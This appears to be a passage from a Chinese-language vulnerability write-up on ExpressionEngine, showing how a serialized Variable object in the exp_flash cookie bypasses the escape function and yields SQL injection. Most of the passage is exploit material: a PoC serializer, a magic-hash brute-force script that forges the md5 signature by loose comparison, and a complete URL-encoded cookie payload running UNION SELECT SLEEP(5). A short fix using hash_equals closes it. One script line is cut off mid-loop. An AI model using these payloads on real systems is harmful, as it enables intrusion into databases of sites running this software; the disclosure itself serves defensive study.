    343   $interval = ee()->config->item('password_lockout_interval') * 60;
    344
    345   $lockout = ee()->db->select("COUNT(*) as count")
    346     ->where('login_date > ', time() - $interval)
    347     ->where('ip_address', ee()->input->ip_address())
    348     ->where('username', $username)
    349     ->get('password_lockout');
    350
    351   return ($lockout->row('count') >= 4) ? TRUE : FALSE;
    352 }
这个函数似乎是通过数据库检查用户的存在性和合法性。 $username的值可控，我们应该能够在这里注入我们自己的SQL参数，进而导致SQL注入。
Expression Engine使用数据库驱动类来与数据库交互，但原始数据库语句就像下面这样（我们可以猜得八九不离十）：
    SELECT COUNT(*) as count FROM (`exp_password_lockout`) WHERE `login_date` > '$interval' AND `ip_address` = '$ip_address' AND `username` = '$username';
我们将$payload数据修改为：
     a:2:{s:13:":new:username";s:1:"'";s:12:":new:message";s:7:"taquito";}
并发出请求，希望能够出现“Syntax error or access violation: 1064 You have an error in your
SQL syntax; check the manual that corresponds to your MySQL server version for
the right syntax to use near ”’ at line“的错误，但是什么也没有发生…
**绕过数据库类型检查**
经过一番搜索后，我们在“./system/ee/legacy/database/DB_driver.php”中遇到了以下代码：
    525 function escape($str)
    526 {
    527   if (is_string($str))
    528   {
    529     $str = "'".$this->escape_str($str)."'";
    530   }
    531   elseif (is_bool($str))
    532   {
    533     $str = ($str === FALSE) ? 0 : 1;
    534   }
    535   elseif (is_null($str))
    536   {
    537     $str = 'NULL';
    538   }
    539
    540   return $str;
    541 }
在第527行，我们看到对我们的值执行“is_string（）”检查，如果它是真的，我们的值被转义。
我们可以通过在函数的开头和结尾放置一个“var_dump”检查变量：
    string(1) "y"
    int(1)
    int(1)
    int(1)
    int(0)
    int(1)
    int(3)
    int(0)
    int(1)
    int(1486399967)
    string(11) "192.168.1.5"
    string(1) "'"
    int(1)
    string(3) "'y'"
    int(1)
    int(1)
    int(1)
    int(0)
    int(1)
    int(3)
    int(0)
    int(1)
    int(1486400275)
    string(13) "'192.168.1.5'"
    string(4) "'''"
    int(1)
果然，我们可以看到我们的“'”的值已经被转义，现在是“’”。不过我还有个锦囊妙计。
转义检查只是判断“$str”是一个字符串，一个布尔值或是null; 如果它不匹配任何这些类型，“$str”将不会进行转义。
这意味着如果我们提供一个“对象”，那么我们应该能够绕过函数检查。 但是，这也意味着我们需要找到一个我们可以使用的php对象。
**自动加载器'驰援'**
通常，当我们想要寻找可以利用unserialize的类时，我们将搜寻魔术方法（如“__wakeup”或“__destruct”），但是有时候应用程序实际上使用自动加载器。
自动加载背后的一般想法是，当一个对象被创建时，PHP会检查它是否知道该类的任何内容，如果没有，它会自动加载它。
对我们来说，这意味着我们不必依赖包含“__wakeup”或“__destruct”方法的类。
我们只需要找到一个我们可控的“__toString”的类，因为程序把$username作为字符串处理。
我们找到以下文件“./system/ee/EllisLab/ExpressionEngine/Library/Parser/Conditional/Token/Variable.php”：
     1 /* php code*/
     2
     3  namespace EllisLabExpressionEngineLibraryParserConditionalToken;
     4
     5  class Variable extends Token {
     6
     7    protected $has_value = FALSE;
     8
     9    public function __construct($lexeme)
    10    {
    11      parent::__construct('VARIABLE', $lexeme);
    12    }
    13
    14    public function canEvaluate()
    15    {
    16      return $this->has_value;
    17    }
    18
    19    public function setValue($value)
    20    {
    21      if (is_string($value))
    22      {
    23        $value = str_replace(
    24          array('{', '}'),
    25          array('{', '}'),
    26          $value
    27        );
    28      }
    29
    30      $this->value = $value;
    31      $this->has_value = TRUE;
    32    }
    33
    34    public function value()
    35    {
    36      // in this case the parent assumption is wrong
    37      // our value is definitely *not* the template string
    38      if ( ! $this->has_value)
    39      {
    40        return NULL;
    41      }
    42
    43      return $this->value;
    44    }
    45
    46    public function __toString()
    47    {
    48      if ($this->has_value)
    49      {
    50        return var_export($this->value, TRUE);
    51      }
    52
    53      return $this->lexeme;
    54    }
    55  }
    56
    57  // EOF
这个类看起来非常适合！
我们可以看到对象使用参数“$lexeme”调用“construct”，然后调用“toString”，将参数“$lexeme”作为字符串返回，完美！。让我们写一个POC为我们创建序列化对象：
    /* php code*/
    namespace EllisLabExpressionEngineLibraryParserConditionalToken;
    class Variable {
            public $lexeme = FALSE;
    }
    $x = new Variable();
    $x->lexeme = "'";
    echo serialize($x)."n";
    ?>
    Output:
    $ php poc.php
    O:67:"EllisLabExpressionEngineLibraryParserConditionalTokenVariable":1:{s:6:"lexeme";s:1:"'";}
经过几个小时的测试，当我们将我们的对象添加到我们的数组中时（注意其中的反斜线）：
a:1:{s:13:":new:username";O:67:"EllisLab\\\ExpressionEngine\\\Library\\\Parser\\\Conditional\\\Token\\\Variable":1:{s:6:"lexeme";s:1:"'";}}
当我们使用上面的payload发出请求后，我们插入到代码中用于调试的“var_dump()”函数显示：
    string(3) "'y'"
    int(1)
    int(1)
    int(1)
    int(0)
    int(1)
    int(3)
    int(0)
    int(1)
    int(1486407246)
    string(13) "'192.168.1.5'"
    object(EllisLabExpressionEngineLibraryParserConditionalTokenVariable)#177 (6) {
      ["has_value":protected]=>
      bool(false)
      ["type"]=>
      NULL
      ["lexeme"]=>
      string(1) "'"
      ["context"]=>
      NULL
      ["lineno"]=>
      NULL
      ["value":protected]=>
      NULL
    }
我们生成了一个“对象”而不是一个“字符串”，“lexeme”的值是没有转义的“‘”！接下来我们发现：
    Exception Caught
    SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 5:
    SELECT COUNT(*) as count
    FROM (`exp_password_lockout`)
    WHERE `login_date` >  1486407246
    AND `ip_address` =  '192.168.1.5'
    AND `username` =  '
    mysqli_connection.php:122
我们成功的通过php对象注入完成了sql注入！
**完整POC**
最后，我们来创建了一个poc来使得数据库sleep 5秒。
    /* php code*/
    set_time_limit(0);
    define('HASH_ALGO', 'md5');
    define('garbage_MAX_LENGTH', 8);
    $charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $str_length = strlen($charset);
    function check($garbage)
    {
        $length = strlen($garbage) + 26;
        $salt = "033bc11c2170b83b2ffaaff1323834ac40406b79";
        $payload = 'a:1:{s:+13:":new:username";O:67:"EllisLab\ExpressionEngine\Library\Parser\Conditional\Token\Variable":1:{s:+6:"lexeme";s:+'.$length.':"1 UNION SELECT SLEEP(5) # '.$garbage.'";}}';
        #echo "Testing: " . $payload . "n";
            $hash = md5($payload.$salt);
            $pre = "0e";
        if (substr($hash, 0, 2) === $pre) {
            if (is_numeric($hash)) {
              echo "$payload - $hashn";
            }
          }
    }
    function recurse($width, $position, $base_string)
    {
            global $charset, $str_length;
            for ($i = 0; $i 
    Output:
    $ php poc2.php
    a:1:{s:+13:":new:username";O:67:"EllisLab\ExpressionEngine\Library\Parser\Conditional\Token\Variable":1:{s:+6:"lexeme";s:+31:"1 UNION SELECT SLEEP(5) # v40vP";}} - 0e223968250284091802226333601821
然后发出请求（请再次注意反斜杠）：
    Cookie: exp_flash=a%3a1%3a{s%3a%2b13%3a"%3anew%3ausername"%3bO%3a67%3a"EllisLab\\ExpressionEngine\\Library\\Parser\\Conditional\\Token\\Variable"%3a1%3a{s%3a%2b6%3a"lexeme"%3bs%3a%2b31%3a"1+UNION+SELECT+SLEEP(5)+%23+v40vP"%3b}}0e223968250284091802226333601821
等待5秒，我们便能收到服务器响应！
**漏洞修复**
将以下代码：
    if (md5($payload.$this->sess_crypt_key) == $signature)
替换为：
    if (hash_equals(md5($payload.$this->sess_crypt_key),$signature))